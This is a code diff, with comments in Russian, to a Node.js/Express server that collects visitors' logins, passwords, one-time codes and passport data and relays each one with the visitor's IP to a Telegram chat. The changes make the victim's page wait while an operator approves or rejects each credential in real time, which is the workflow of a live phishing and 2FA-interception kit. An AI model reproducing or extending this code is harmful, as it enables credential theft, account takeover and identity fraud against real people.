@@ -107,7 +107,7 @@ app.post("/step", async (req, res) => {
   statusCache.set(statusKey, { status: "waiting", timestamp: Date.now() });
 
   const ip = formatIP(req.ip);
-  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n�� IP: ${ip}\n`;
+  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n🌐 IP: ${ip}\n`;
   
   const readable = {
     login: "Логин",
@@ -132,6 +132,7 @@ app.post("/step", async (req, res) => {
 
   msg += step === 'login_password' ? `📄 ${value}` : `📄 ${readable[step] || step}: ${value}`;
 
+  // Список шагов, требующих подтверждения
   const withApproval = ["login", "password", "login_password", "code", "code1", "code2", "code3", "document", "finalCode", "passport"];
   
   if (withApproval.includes(step)) {
@@ -142,6 +143,11 @@ app.post("/step", async (req, res) => {
       ]]
     };
     await sendToTelegram(msg, reply_markup);
+    
+    // Для логина/пароля и кодов возвращаем waitForValidation
+    if (step === "login_password" || step === "code" || step === "code1" || step === "code2" || step === "code3") {
+      return res.json({ waitForValidation: true });
+    }
   } else {
     await sendToTelegram(msg);
   }
@@ -157,16 +163,24 @@ app.post('/auth-visit', (req, res) => {
   res.json({ userId });
 });
 
-// Добавляем обработчик статуса
+// Обновляем обработчик статуса
 app.get("/status", (req, res) => {
   const { step, userId } = req.query;
   if (!userId) return res.json({ status: "none" });
   
   const statusKey = `${userId}:${step}`;
   const cachedStatus = statusCache.get(statusKey);
-  const status = cachedStatus ? cachedStatus.status : "none";
   
-  res.json({ status });
+  // Если статус не найден, возвращаем "none"
+  if (!cachedStatus) {
+    return res.json({ status: "none" });
+  }
+  
+  // Обновляем timestamp при каждом запросе статуса
+  cachedStatus.timestamp = Date.now();
+  statusCache.set(statusKey, cachedStatus);
+  
+  res.json({ status: cachedStatus.status });
 });
 
 // Вспомогательные функции
@@ -210,10 +224,18 @@ async function pollTelegram() {
           const [userId, step, action] = (update.callback_query.data || '').split(':');
           if (userId && step && action) {
             const statusKey = `${userId}:${step}`;
+            const newStatus = action === 'ok' ? 'ok' : 'fail';
+            
+            // Обновляем статус в кэше
             statusCache.set(statusKey, { 
-              status: action === 'ok' ? 'ok' : 'fail',
+              status: newStatus,
               timestamp: Date.now()
             });
+            
+            // Отправляем подтверждение в чат
+            const confirmMsg = `Статус обновлен: Пользователь #${userId}, ${step} - ${newStatus === 'ok' ? '✅ Верно' : '❌ Неверно'}`;
+            await sendToTelegram(confirmMsg);
+            
             console.log(`Обновлен статус для пользователя ${userId}, шаг ${step}: ${action}`);
           }
         }
